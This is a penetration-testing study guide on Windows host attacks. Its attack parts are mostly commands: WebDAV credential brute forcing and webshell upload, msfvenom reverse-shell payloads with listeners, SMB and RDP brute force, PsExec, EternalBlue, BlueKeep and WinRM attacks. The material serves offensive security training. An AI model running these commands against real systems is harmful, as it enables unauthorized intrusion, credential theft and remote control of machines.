##### Table Of Contents
1. [Windows Vulnerabilities](System_Host%20Based%20Attacks.md#windows-vulnerabilities)
2. [Exploiting Windows Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-windows-vulnerabilities)
	- IIS and WebDav
	- SMB Exploitation with PsExec
	- EternalBlue
	- RDP
	- BlueKeep
1. [Windows Privilege Escalation](System_Host%20Based%20Attacks.md#windows-privilege-escalation)
2. [Windows File System Vulnerabilities](System_Host%20Based%20Attacks.md#windows-file-system-vulnerabilities)
3. [Windows Credential Dumping](System_Host%20Based%20Attacks.md#windows-credential-dumping)
4. [Linux Vulnerabilities](System_Host%20Based%20Attacks.md#linux-vulnerabilities)
5. [Exploiting Linux Vulnerabilities](System_Host%20Based%20Attacks.md#exploiting-linux-vulnerabilities)
6. [Linux Privilege Escalation](System_Host%20Based%20Attacks.md#linux-privilege-escalation)
7. [Linux Credential Dumping](System_Host%20Based%20Attacks.md#linux-credential-dumping)


---

## Introduction

System/host-based attacks are specialized attacks targeting specific systems running operating systems like Windows or Linux. These attacks typically occur after gaining access to a network and focus on exploiting inherent vulnerabilities or misconfigurations in servers, workstations, or laptops. Unlike network-based attacks, system-based attacks require a deeper understanding of the target operating system and its specific vulnerabilities. While network services are common attack vectors, system/host-based attacks highlight the importance of focusing on internal OS vulnerabilities once inside the network.

# Windows-Vulnerabilities

The various OS versions makes the threat surface fragmented since some vulnerabilities  that exist in on OS might not be present in another. All Windows versions share common issues:
- The OS is built in C, making them prone to buffer overflows, arbitrary code exec etc. 
- Vulnerable to cross platform vulnerabilities (ie SQL Injection attacks)
- Vulnerable to physical attacks (theft, malicious usb devices)
### Common Windows Vulnerability Types

- **Information Disclosure:** Allows unauthorized access to sensitive data.
- **Buffer Overflows:** Caused by programming errors, allowing malicious code to overwrite memory and potentially execute malware or provide remote access.
- **Remote Code Execution:** Lets attackers execute code remotely on the system.
- **Privilege Escalation:** Allows attackers to elevate privileges post-compromise, often due to misconfigurations.
- **Denial of Service (DoS):** Overloads system resources, preventing normal operation.
### Commonly Exploited Windows Services

- **Microsoft IIS** (TCP 80/443): Web server software used on Windows.
- **WebDAV** (TCP 80/443): HTTP extension for file management on web servers.
- **SMB/CIFS** (TCP 445): File sharing protocol for local networks.
- **RDP** (TCP 3389): Remote access protocol used for GUI-based interactions with Windows systems.
- **WinRM** (TCP 5986/443): Windows remote management protocol for executing remote commands.

# Exploiting-Windows-Vulnerabilities


### IIS-and-WebDav

**IIS (Internet Information Services)** is a web server developed by Microsoft for the Windows NT family. It can be used to host static and dynamic websites and web apps developed in  ASP.NET/ PHP and provides a GUI for managing websites. Typically running on ports 80 and 443, IIS handles executable file extensions like `.asp`, `.aspx`, `.config`, and `.php`.

**WebDAV (Web-based Distributed Authoring and Versioning)** is an extension of HTTP that allows users to  edit/manage files on web servers, essentially turning a web server into a file server. It can run on top of IIS, Apache etc over ports 80/443 and requires authentication via a username and password to connect.

#### WebDAV Exploitation without Metasploit
1. Check if WebDav is configured on the IIS server using a tool like nmap
2. After confirming which directory webdav is enabled on, confirm if authentication is required. If so, perform a brute force against the directory using Hydra to get the credentials.
3. Run DavTest to test the WebDav Server and confirm file types that can be executed (like asp) for the payload.
4. Using the found credentials with Cadaver, upload the asp webshell payload that's provided by Kali.
5. Using a browser, navigate to location in the WebDav directory the payload was uploaded to and execute the webshell script. You should be allowed an area for command execution on the server.

#### Initial Nmap Scan

Goal: See if WebDav is enabled, what directory is it enabled on and if authentication is needed

Can run an initial scan to get general information on the target

```
nmap -Pn -sV -sC <target>
```

- `-Pn` = Port scan without ping 
- `-sV`  = Service version check
- `-sC` = Important Here: Runs additional scripts on each port to enumerate information.
- Note: Not specifying port options means nmap will scan the top 1000 most common ports

The `-sC` options is helpful since it can tell if WebDAV is enabled using scripts like '*http-webdav-scan*'. This might not show the directories that WebDav is enabled on, so we can run an additional Nmap script scan using the `http-enum` nmap script against the port WebDav is running (80/443) to confirm the directory and if authentication is enabled:

```
nmap -sV -p80 --script=http-enum <target>
```

The http-enum script should return some helpful information like <u>the directory webdav might be enabled on</u>. If you get a response like `401 Unauthorized` then authentication has been enabled on the WebDav server. You can manually check that location in the browser.

```
http://target/listed_webdav_directory/
```

**Performing a Brute Force Against WebDav** 

We can use `hydra` to perform the brute force against the WebDav service. Be careful of the performing a brute force on any service since it could cause a DoS (Denial of Service). Be aware that wordlists might not have the credentials you're looking for so you'd want to perform more reconnaissance to confirm the users that will have access to WebDav. For the passwords, there's a lot of wordlists out there that might provide the actual credentials.

```
hydra -L users_file -P passwords_file <target> http-get <webdav_directory>
```


Example: 

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.41.42.41 http-get /webdav/
```


#### Davtest

Davtest is a WebDAV scanner used for scanning, authenticating, and exploiting WebDAV servers. Used for checking if authentication is enabled, authenticate with it and run checks to show what can be done for exploitation.  Davtest comes pre-installed on most penetration testing distributions like Kali and Parrot OS.


**Authentication**

```
davtest -url <target_location>
```
- `-url` = url of DAV location

Example:
```
davtest -url http://10.16.25.85/webdav
```

An `Unauthorized` response would mean valid credentials is required.

To provide the creds, use the `-auth` option and then include  `username:password`:
```
davtest -auth <user>:<password> -url <target__location>
```

Example:
```
davtest -auth admin1:412pass -url http://10.16.25.85/webdav
```

The  results for DavTest will have the following checks show in the output
1. **Testing DAV Connection** = Authenticates WebDav and creates a random string for the session (like `E93ge9fF39Giz`) which is  appended to any directory or file that is created
- `http://10.16.25.85/webdav`
	- Also creates a random string for the session (like `E93ge9fF39Giz`)
2. **Creating creating** | Tries creating a directory
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz` 
3. **Sending test files** | Tries uploading test files like txt,jsp,aspx etc)   
- `http://10.16.25.85/webdav/DavTestDir_E93ge9fF39Giz/davtest_E93ge9fF39Giz.aspx` 
4. **Checking for test file execution:** Tests the execution of each type of file that was uploaded. Important to see which types of files can be executed on the server.
	- <u>Asp would be good for generating an asp payload or uploading an asp webshell which can be accomplished by cadaver.</u>

### Cadaver

Cadaver is a tool for WebDAV clients that lets us upload and download files from the WebDav directory. Also comes pre-installed on most penetration testing distributions like Kali and Parrot OS.
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

You'd then be promoted for the username and password

```
Username: user
Password: rando_pass
```

You'll be given a psuedo shell to interact with the server | `dav:/directory/>`

##### Upload the Webshell using Cadaver

We can upload a webshell to get some kind of command execution on the target system. A webshell is a script or program uploaded to a web server, which can allow us to remotely execute commands, manipulate files, or access the server's resources. It essentially serves as a backdoor, giving us control over the server.  

1. **Find the Webshell:** Kali Linux comes pre-packaged with various webshells grouped by programming languages including `asp, aspx, cfm, jsp, perl, php `. They can be found in:
```
/usr/share/webshells/
```

Kali has a webshell for asp located at :
```
/usr/share/webshells/asp/webshell.asp
```

2. **Upload the Webshell to the WebDav server**: This can be uploaded through cadaver to the WebDav Server using a PUT command:
```
put /usr/share/webshells/asp/webshell.asp
```

3. **Execute the Webshell script:**  Once the webshell has been uploaded, navigate to that  file location in the WebDav directory it was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/webshell.asp` from the browser, click on the file to trigger the script.
4. **Interact with the Server**:  Webshells normally comes with a user-friendly interface like input fields/search boxes that allows attackers to interact with the compromised server. After executing the `webshell.asp` script, there should be a search box which would let you run commands on the target system where the output would. We can do anything like searching for files, executing shell commands, or navigating directories. 

- List directory content with `dir`
```
dir C:\
```

- Print out file contents
```
type C:\flag.txt
```

### Exploiting WebDav With Metasploit
We're trying to get a meterpreter session(reverse shell) on the target using Metasploit

1. Perform an initial `nmap` scan to check if Webdav is available on the target using the `http-enum` nmap script:
```
nmap -sV -p80 --script=http-enum <target>
```

#### Generating payload using MSFVenom

MSFVenom is used for generating payloads for reverse shells or remote access. We'll generate a reverse_tcp asp payload here. The cmd for msfvenom will need to pick the `-p` payload option, set the `LHOST`/`LPORT` to the IP & local port where the payload will connect back to, the payload's file type `-f` and its name. The payload should be stored in the home directory:

Syntax:
```
msfvenom -p payload LHOST=atk_machine LPORT=l_port -f file_type > file_name
```

Example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.15.12.2 LPORT=1234 -f asp > shell.asp
```

**Note**: If you're not familiar with the target's architecture for `windows/meterpreter/reverse_tcp`, it's recommended to use the x86(32-bit) architecture since it would work for with 32-bit or 64-bit.

##### Upload the Msfvenom Payload using Cadaver

We'll use Cadaver to upload the payload, enter the webdav location on the target and enter the credentials(if needed):
```
cadaver <target_location>
```

Example:
```
cadaver http://10.16.25.85/webdav/
```

```
Username: user
Password: rando_pass
```

You be given the a psuedo shell to interact with the server | `dav:/directory/>`

Here, we'll upload the payload made by msfvenom using a `PUT` command:
```
dav:/<webdav_directory/> put payload
```

Example:
```
dav:/webdav/> put /root/shell.asp
```

### Setup a listener for the payload using the multi/handler module

We'll need to setup a handler that would wait for the connection from the payload which the `multi/handler` module can be used for.

1. **Start Postgresql and Metasploit** 
```
service postgresql start && msfconsole
```

2. **Use the module**
```
msf6> use multi/handler
```

3. **Configure the module:** Set the configured payload to the one set from msfvenom. For this example, we used `windows/meterpreter/reverse_tcp`. Next, we'll need to set the `LHOST`/`LPORT` to the same one specified in the payload:

```
msf6> set payload windows/meterpreter/reverse_tcp

msf6> set LHOST 10.15.12.2

msf6> set LPORT 1234
```
4. **Run the module**: This will start the listener. When the payload is executed on the target it will connect back here.

```
msf6> run
```

5. **Execute the Payload :**  Navigate to that  file location in the WebDav directory that the payload was uploaded to from the browser. So, if it was uploaded to `/uploads/` you'd visit `http://targetsite.com/uploads/shell.asp` from the browser, click on the file to trigger the script. This should start meterpreter session.


## Automate the process using MSF Modules

We can use the `exploit/windows/iis/iis_webdav_upload_asp` module to upload a meterpreter asp file onto the webdav server which would automate the payload creation/upload process to get a meterpreter session.

1. First, we can search for `iis upload` or just use the module: 
```
search iis upload
```

```
use exploit/windows/iis/iis_webdav_upload_asp
```

2. **Configure the module**: We'll need to provide the username/password for the WebDav server using the `HttpUsername`/`HttpPassword` settings. Also, need to set the target address with `RHOSTS` and then set the `PATH` option to the filename and location where you want to upload the asp file to:
```
set HttpUsername person1
set HttpPassword password9881
set RHOST 10.65.4.88
set PATH /webdav/metasploit.asp
```
3. **Run the exploit**: This should start the meterpreter session
```
exploit
```



## SMB-Exploitation-with-PsExec

SMB (Server Message Block) is a network file-sharing protocol used primarily for sharing files, printers, and other peripherals within a local network. Initially, SMB ran over NetBIOS using port 139 but has since migrated to operate over TCP on port 445. SAMBA is the open-source implementation of SMB on Linux, which allows interoperability with Windows systems, enabling file and device sharing.
##### SMB Authentication Process

The SMB protocol uses two levels of authentication:
- **User Authentication**: Users provide a username and password to access a network resource.
- **Share Authentication**: Users provide a password to access specific, restricted shares.

Both methods rely on the NTLM (NT LAN Manager) challenge-response protocol to securely authenticate without sending the password over the network:
1. <u>Client Sends Username</u>: The client sends its username to the server.
	- *Client sends `"user1"` to the server.*
2. <u>Server Sends a Challenge</u>: The server responds with a unique, random challenge back to the client.
	- *Server sends `XYZ789` to the client.*
3. <u>Client Hashes the Password</u>: The client hashes the user’s password using the NTLM algorithm.
	- *Password `MyPassword123` is hashed to `8F29A0B676...`.*
4. <u>Client Encrypts the Challenge</u>: The client uses the NTLM-hashed password as a key to encrypt the server’s challenge. This is symmetric encryption, where the same secret (hashed password) is shared between client and server.
	- *The client encrypts `XYZ789` with the hash `8F29A0B676...` , producing `D4E8F6A2...`.*
5. <u>Client Sends Encrypted Response</u>: The client sends the challenge encrypted using the NTLM hashed password  challenge back.
	- *Client sends `D4E8F6A2...` to the server.*
6. <u>Server Verifies the Response</u>: The server encrypts the challenge it sent using the NTLM hash of the password for the account as a key, just like the client did. It then compares the result to the client’s response. If they match, authentication succeeds.
	- *The server encrypts `XYZ789` using the stored hash. If the result matches `D4E8F6A2...`, authentication succeeds.*

##### PsExec 

PsExec is a command-line utility from Microsoft's Sysinternals suite that enables administrators to execute commands/processes on remote Windows systems. It was developed to be a telnet replacement. PxExec operates over SMB for authentication, using the provided credentials to run the processes remotely. PsExec provides on command-line interactions unlike Remote Desktop Protocol (RDP), which provides a GUI to a target system. PsExec doesn't need to be installed. It operates by copying its executable (`psexesvc.exe`) to the target machine's administrative share ( `ADMIN$`), where it installs and runs a service to execute the specified commands. After execution, PsExec removes the service and the executable from the target system.

- Link to PsTools Package Download: https://download.sysinternals.com/files/PSTools.zip

##### SMB Exploitation with PsExec

To exploit SMB using PsExec, aim to obtain legitimate credentials, such as a username/password or password hash. This can be achieved through techniques like SMB login brute-force attacks, focusing on common Windows user accounts (e.g., **Administrator**).

Once valid credentials are obtained, we can authenticate with the remote system via PsExec and execute arbitrary commands or initiate a reverse shell. This  would give command-line control over the system, allowing further exploitation or ability to escalate privileges within the network.

1. **Initial Nmap Scan**: Use the `-sV` flag to get the service version and `-sC` to run the default nmap script scans. If you get results like `smb2..` for SMBv2 so we can authenticate the SMB service using PsExec
```
nmap -sV -sC target
```

2. **Perform SMB Brute Force**: This can be done through the smb_login metasploit auxiliary module. Start PostgreSQL and Metasploit `service postgresql && msfconsole`, then either just search for `smb_login` or just use `auxiliary/scanner/smb/smb_login`.  We'll need to provide the `RHOSTS` for the target. We could provide `SMBDomain` if the target is domain-joined including the domain account and password with `SMBUser`/`SMBPass`. Since we're performing a brute-force, we'll need to set the `USER_FILE` and `PASS_FILE` file, some sample wordlists are:
	- Users: `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
	- Passwords: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

	We also want to just see the successful logins so we can also set the `VERBOSE` option to false.
```
### (Optional) search smb_login ###

use auxiliary/scanner/smb/smb_login

set RHOSTS 10.33.60.54

set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt

set USER/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

set VERBOSE false
```

Run the module using `run`. Keep track of any Administrator accounts.

#### Psexec.py Python Script

Since Microsoft's PsExec is an executable designed to only run on windows systems, it isn't compatible with non-Windows systems (eg Kali). Impacket offers a suite of Python tools for network protocol interactions, including `psexec.py` which is a python script that emulates PsExec's functionality enabling the execution of processes on remote Windows systems from different source platforms, like Linux/MacOs.

The psexec.py script works similarly to the Microsoft version by creating a service on the target host, uploading a randomly named executable to the `ADMIN$` share, and communicating over a named pipe to provide an interactive remote shell with SYSTEM privileges. After execution, `psexec.py` removes any components it deployed on the target system.

- **Impacket Github**: https://github.com/fortra/impacket/tree/master

You can clone the Impacket repository and the psexec.py script would reside in the `examples` subdirectory (...impacket/examples/psexec.py). Ensure that all dependencies are installed.

```
git clone https://github.com/fortra/impacket.git
cd impacket
pip install .
```

By default, `psexec.py` launches a interactive command shell (`cmd.exe`) on the target. 
```
psexec.py Administrator:Password@10.63.45.88
```

If its apart of a domain include the domain before the user account separated with a slash (`...mydomain/Administrator...`). To execute a specific command, add it to the command line. This should return the output of the command back to your shell:
```
psexec.py Administrator:Password@10.63.45.88 ipconfig
```

#### PsExec Metasploit Module

The psexec exploit module `exploit/windows/smb/psexec`  will authenticate through psexec to smb and then upload a meterpreter payload.  This is installing software on the target so be aware of Antivirus solutions which could detection the software as malicious.

1. **Find/Use the module**: Can just search for `psexec` in Metasploit and select the psexec exploit  or `use exploit/windows/smb/psexec `. The payload will probably be set to `windows/meterpreter/reverse_tcp` which 32-bit but its fine:
```
#### search psexec ####

use exploit/windows/smb/psexec
```
2. **Configure the module**: We'll need to set the target with `RHOSTS` and then the `SMBUser`  and `SMBPass` of the account. You can also configure the payload which you can set to your machine `LHOST` & `LPORT`.

```
set RHOST target
set SMBUser <username>
set SMBPass <password>
```
4. Run the exploit using just `exploit`. This should start a meterpreter session if successful.

### EternalBlue

EternalBlue (CVE-2017-0144) is a Windows vulnerability developed by the NSA that exploits a flaw in the SMBv1 protocol, allowing attackers to remotely execute code by sending crafted packets. It can lead to reverse shells/meterpreter sessions and includes automatic privilege escalation. The vulnerability gained notoriety during the **WannaCry ransomware attack** in 2017, which used EternalBlue to spread across networks, infecting Windows systems. EternalBlue impacts various Windows versions, including Vista, 7/8.1/10, and Windows Server 2008/2012/2016, particularly effective on Windows 7/8.1 and Server 2008/2012. A patch was released in March 2017, though many systems remain unpatched.

Metasploit offers an **auxiliary module** to check for vulnerable systems and an **exploit module** to target unpatched systems, providing privileged access and a meterpreter session.

#### Initial Nmap Scan to Check if Vulnerable to Eternal Blue

Run an Nmap scan to identify open ports but we're mainly interested in SMB which is 445. Include the  `smb-vuln-ms17-010` Nmap script to check if the target is vulnerable to the Eternal Blue exploit:

```
nmap -sV -O -p445 --script=smb-vuln-ms17-010 target
```

- `-sV`= Checks the version of services
- `-O` = Checks Operating system | Will confirm what version of windows is running
- `-p 445` = Port 445

If the system is vulnerable, we can execute the exploit.
#### Option A.) Manual Exploitation of Eternal Blue

###### Manual Exploitation Process: 
1. <u>Generate Shellcode/Payload</u>: To exploit EternalBlue using AutoBlue, we first need to generate shellcode payload, that gives us a reverse shell after the SMB vulnerability has been exploited.
2. <u>Setup listener</u>: Once that's generated, we'll need to setup our netcat listener
3. <u>Run the python exploit</u>: Run the python exploit script (`eternalblue_exploit*.py`) specify the target IP and the shell code we would like to exploit then we should get a reverse shell on the netcat listener

**Autoblue** is an automated script used to exploit the EternalBlue vulnerability (CVE-2017-0144), without the need for Metasploit.   You can clone the AutoBlue repository (https://github.com/3ndG4me/AutoBlue-MS17-010): 
```
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
```

The folder will contain:
1. Python exploit files for each version of Windows
	- `eternalblue_exploit7.py` (and server 08)
	- `eternalblue_exploit8.py` (and 8.1)
	- `eternalblue_exploit10.py`
2. requirements.txt  - Helpful for getting python dependencies installed
```
pip install -r requirements.txt
```
3. 'shellcode' directory: Will have the script we need for creating the payload
##### Generating Shell Code

We're going to run the bash script `shell_prep.sh` under the `shellcode` directory of the package (`../EternalBlue/AutoBlue-MS17-010/shellcode`). 

1. **Double-check permission**:Make sure to add execution permissions to the script before attempting to run it:
```
chmod +x shell_prep.sh
```
- `+x` = Adds execution permission onto the script

2. **Execute the script**
```
./shell_prep.sh
```

3. **Respond to  'Eternal Blue Windows Shellcode Compiler' prompt**:  Should get the prompt `...would you like to auto generate a reverse shell with msfvenom (Y/n`. **msfvenom** is a tool that generates payloads, which are small pieces of code sent to a target system once it's compromised. In this case, it will create a **reverse shell**, which means the compromised system will initiate a connection back to an attacker's machine (us), allowing remote control. We'll say `yes` here.

- Set your machine's IP for `LHOST` (Local Host)
```
LHOST for reverse connection: 
10.23.25.45
```
- Set you listening ports of your machine for the payloads:
```
LPORT you want x64 to listen to:
1234
LPORT you want x86 to listen to:
1234
```
- Specify if you want to generate a meterpreter shell or regular cmd shell (We'll choose 1)
```
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
1
```
- Specify if you want to generate a staged or stageless payload: A **non-staged (stageless) payload** sends the entire payload all at once, whereas  staged payloads sends a small piece first before sending the rest. 

```
Type 0 to generate a staged payload or 1 to generate a stageless payload
1
```

- **Generate the payload**: It will take to some to generate the shellcode but it would be saved  in the shellcode directory. **The payload will be exported into a bin file (ie `sc_x64_msf.bin`) which is where the shell code is saved.** Once its generated, we should be able to execute either the x64 or x86 shell code depending on the target OS's architecture.  Now we can setup our netcat listener.
##### Set up Netcat Listener 
Netcat (often abbreviated as **nc**) is a networking tool used for tasks like port scanning, file transfers, and establishing connections between computers. One of its key features is the ability to set up a listener, which waits for incoming connections on a specified port. To set up a basic listener in Netcat, you would use the command `nc -l -p <port>`, where the **-l** flag tells Netcat to listen and **-p** specifies the port number. 

```
nc -nvlp 123
```
- `-l`: Listener | This tells Netcat to listen for incoming connections 
- `-p 1234`: Specifies the port number to listen on, which in this case is port 1234.
- `-n`: (Optional) | Tells Netcat not to resolve hostnames (use raw IP addresses instead). This speeds things up and avoids DNS lookups.
- `-v`:  (Optional) Runs Netcat in **verbose** mode, providing detailed output

This creates a simple server that will wait for incoming data or connections on the chosen port. We'll need to keep the tab open and wait for the shell. With the listener setup, now we can run the python executables for the exploit.

##### Running the Exploit

1. We're going to run the bash script `shell_prep.sh`. Make sure to add execution permissions to the python script before attempting to run it:

```
chmod +x eternalblue_exploit7.py
```
- `+x` = Adds execution permission onto the script

2. **Execute the script**: Specify the `eternalblue_exploit*.py` script, target and then the binary file for the shellcode
```
python eternalblue_exploit_py target shellcode_binary
```

Example
```
python eternalblue_exploit7.py 10.82.54.22 shellcode/sc_x64.bin
```

If you go back to the netcat listener, you'll see the cmd-shell open from it.

### Option B.) Exploit with Metasploit

1. Open `msfconsole`
```
msfconsole
```

2. Search for the Eternal Blue exploit:  There's an auxiliary module (auxiliary/scanner/smb/smb_ms17_010) that tells you if the system is vulnerable and a exploit module `exploit/windows/smb/ms17_010_eternalblue`. Go and select the exploit....
```
search eternalblue

use exploit/windows/smb/ms17_010_eternalblue
```
3. Configure and run the exploit module: Mainly just need to set the target and your machine's IP and local port.
	- `RHOSTS` = Target system 
	- `LHOST`/`LPORT` | Your system's local host IP and its listening port

```
set RHOSTS 10.82.54.22 
```

After configuring changes, run the exploit using `exploit`. The exploit is done and a meterpreter session should be established. The username allowed should be NT AUTHORITY\\SYSTEM


### RDP

The Remote Desktop Protocol (RDP), developed by Microsoft, is used to remotely connect and interact with Windows systems. By default, it operates on TCP port 3389, though it can be configured to use other ports. Its common common that RDP could be running on a different port. RDP authentication requires a valid user account and the associated password in clear text. <u>We can exploit RDP by performing brute-force attacks to identify valid user credentials  and gain remote access to the target</u>. 

1. **Perform an initial Nmap scan against the target**: Make sure to scan the entire TCP port range `-p-` since RDP could be configured on a different port. Can also ran this as a SYN Scan `-sS` to make this more stealthier.
```
nmap -sV -O -sS -p- target
```

If you don't see a RDP confirmed on port 3389 or as a service you have two options:
- **Option A**: Connecting directly to RDP on that target and specify the port you believe to be for RDP
- **Option B**: Run the metasploit RDP scanner to confirm if RDP is available on the system.


#### Checking for RDP using Metasploit

We can use the rdp_scanner auxiliary module which would check the ports to see if it can communicate using RDP:

1. Start Postgresql/Metasploit console:
```
service postgresql && msfconsole
```
2. Either search for `rdp_scanner` or use `auxiliary/scanner/rdp/rdp_scanner` 
```
search rdp_scanner

use auxiliary/scanner/rdp/rdp_scanner
```
3. **Configure the module**: We'll need to set the target address using `RHOSTS` and then specify the `RPORT` to a port we believe RDP is running on.

```
set RHOSTS 192.168.41.2

set RPORT 4876
```

4. **Run the scanner**: Use `run` to execute the scanner, it should return build number and some other hostname information of the target also. After getting a confirmation of RDP running on the target, we can brute force to find credentials.

##### Perform Brute Force using Hydra

Hydra can be used here to perform a brute force against the RDP service on the target. Be aware that this could cause a DoS event so the speed of the brute force might need to be adjusted depending on the environment. You need to specify the user name list `-L`, the password list `-P` the protocol like for RDP it would be `rdp://` and the port number `-s`.

- Example User Wordlist: `/usr/share/metasploit-framework/data/wordlists/common_users.txt`
- Example Password Wordlist: `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

```
hydra -L user_list  -P  password_list  protocol://target -s port_number 
```

Example:
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.42.2.41 -s 3333 
```

Hydra will try to actually to connect with any valid credentials using the freerdp client. We'll be using `xfreerdp` to actually connect to the target system.

#### Connect to the Target using XfreeRDP

**xfreerdp** is an open-source client used for connecting to a remote desktop server using the Remote Desktop Protocol (RDP). It is part of the FreeRDP project and is commonly used in Linux environments to connect to Windows machines. We need to specify the username `/u:` the password `/p:` , the target `/v:` and its port number:

```
xfreerdp /u:username /p:password /v:target_ip:rdp_port_number
```

Example:
```
xfreerdp /u:administrator /p:qwertyuiop /v:10.24.5.1:3333
```

This will return the RDP GUI windows for the target.

## BlueKeep

BlueKeep (CVE-2019-0708) is a inherent remote code execution vulnerability in the Windows RDP protocol, publicly disclosed by Microsoft in 2019. Instead of brute forcing for valid user accounts, the vulnerability exploits a flaw in the RDP protocol itself by <u>gaining access to a chunk of kernel memory</u> and remotely executing arbitrary code at the system level without authentication. Attackers specifically target the kernel because it operates in a highly privileged space, so any code ran there will inherit elevated privileges. For instance, executing a meterpreter payload in the kernel would grant a session with elevated access. However, executing code at the kernel level also carries the risk of causing system instability or crashes. Microsoft released a patch for this vulnerability on May 14th, 2019. The BlueKeep vulnerability affects multiple versions of Windows XP/Vista/7 and Windows Server 2008 & R2.

The exploit will fail unless the following prerequisites are met:
1. RDP needs to be enabled
2. Network-level authentication (NLA) can't be enabled

The BlueKeep vulnerability has illegitimate proof of concepts (PoCs) and exploit code that could be malicious, potentially performing tasks unrelated to the exploit itself. Microsoft did not release public PoCs or exploit code for BlueKeep, as doing so would have worsened the vulnerability's impact. Security researchers created PoCs without payloads, demonstrating the vulnerability by performing non-malicious actions like creating files, rather than executing reverse shells. It's recommended to only use verified exploit code to avoid malicious variants.

The BlueKeep exploit includes an MSF auxiliary module to check if a system is vulnerable and an exploit module to target unpatched systems. However, the exploit requires adjustments based on the Windows version and the memory chunk size needed to execute the code. When successful, the exploit provides a standard command shell or a meterpreter session on the target.

1. Perform a port scan to confirm if RDP is running on the target:
```
nmap -p 3389 target
```
2. Run the metasploit auxiliary module to confirm if the version of RDP is vulnerable. Start metasploit with `msfconsole`, and then search '`Bluekeep`':
```
search Bluekeep
```
The results will have the auxiliary module `auxiliary/scanner/rdp/cve_2019_0708_bluekeep` and the exploit, the exploit will also run the aux scanner module. 
```
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
### or "use 0/1" ##
```
Make any configuration changes for the scanner
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```
Type `run`  to start the scan
```
run
```

Run the exploit:

We can select the exploit `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` 
```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
### or "use 0/1" ##
```

Configure the module options:
- `RHOSTS` = The target host
- `RPORT` = Change if RDP is running on a different port from its default
```
set RHOSTS 10.69.65.2
```

Configure the payload options 
- `LHOST` (Listening Host) = Your local machine
- `LPORT`(Listening Port) = The port on your system to listen

Just type `exploit`  to run the exploit
```
exploit
```

Might get a `bad-config` response if you don't specify a target, the module gives the ability to specify the target configuration or version of Windows to target

```
show targets
```

Set target to whatever the ID of the OS running on the target
```
set target 2
```

Part of the output would include something along the lines of `Using CHUNK Grooming strategy. Size 250MB, target address 0xfffffx8011e07000, Channel count 1`.

**Grooming** is the process of preparing a system’s memory or other states to manipulate how resources—such as memory blocks or file handles—are allocated or managed. The goal of grooming is to position vulnerable memory segments in predictable locations, making it easier for an exploit to succeed by taking advantage of these weaknesses.

A common form of grooming is **chunk grooming**, which specifically targets heap memory. The **heap** is a region of memory used for dynamic allocation during the runtime of programs. It's structured into units called **chunks**, which vary in size. Chunk grooming involves controlling how these chunks are allocated and placed, ensuring that vulnerable memory blocks are aligned in a way that increases the likelihood of a successful attack.

In this case, the groomer reserves large blocks of memory in RAM —such as the `250MB` mentioned in the output. By doing so, it forces the operating system to place the vulnerable memory segment (at the address `0xfffffx8011e07000`) in a location that the attacker can predict. Without this grooming, memory could be allocated randomly, which would make it much harder for the exploit to reliably target and manipulate the vulnerable segment. By carefully "grooming" the memory layout, the attacker increases the likelihood that their code will be successfully executed. 

You can try adjusting the size of memory used if this fails.

After the exploit is done, the meterpreter session should be allowed. This works like EternalBlue where we didn't need to elevate our privileges to get admin access. 


## WinRM

WinRM (Windows Remote Management ) is a protocol developed by Microsoft to enable remote access and management of Windows systems over HTTP or HTTPS, simplifying tasks for system administrators. It is commonly used to interact with Windows hosts on a network, execute commands remotely, and manage system configurations. Can login by providing the target IP and then a username with the account password or a password hash. WinRM operates over TCP ports 5985 (HTTP) and 5986 (HTTPS) and incorporates security measures such as access control and authentication.

Tools like _crackmapexec_ can be used to perform brute-force attacks on WinRM to discover user credentials and execute commands on target systems. Additionally, _evil-winrm_, a Ruby script, allows users to establish a command shell session on the target machine.


1. **Perform the initial Nmap scan**: Make sure to either scan the entire TCP port range `-p-` or just the 5985/5986 ports. Windows doesn't have a specific banner for WinRM so don't be too concerned with the service name listed for the port.

```
nmap -sV -p5985,5986 target
```

#### Brute force WinRM using Crackmapexec

The _crackmapexec_ tool can be used for cracking various protocols including winrm. We can use the tool to brute force winrm.
- Available protocols: `ssh | winrm | smb | rdp | mssql | ldap | ftp`

General Brute Force Syntax: 
```
crackmapexec <protocol> -u <user_or_user_wordlist> -p <password_or_password_list>
```

Example:
```
crackmapexec winrm -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

We'd target the administrator account since we'll know its automatically there
also the administrator is typically used by system administrators here and we wouldn't need to perform privilege escalations later.

If there's a match the brute force will display `(Pwn3d!)` and stop the brute force. Now we can use the credentials to execute commands on the target
##### Execute Commands


We can use the `-x` options which can be used to execute commands on the target like `systeminfo` to collect information:

```
crackmapexec winrm -u administrator -p pqaeoirgq -x "systeminfo"
```

### Get a command shell using Evil-WinRM

**Evil-WinRM** is a tool designed for penetration testers to remotely connect to and execute commands on Windows systems via Windows Remote Management (WinRM). It facilitates tasks such as remote command execution, file transfers, and script execution, streamlining post-exploitation activities. Evil-WinRM requires Ruby version 2.6 or higher. Most Linux distributions come with Ruby pre-installed.

**Evil-WinRM Install**

You can install Evil-WinRM as a Ruby gem, which manages dependencies automatically:

```
gem install evil-winrm
```

Alternatively, you can install Evil-WinRM directly from its GitHub repository. Navigate to the project directory and download the dependencies with bundler (`bundle`). 

```
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
bundle install
```

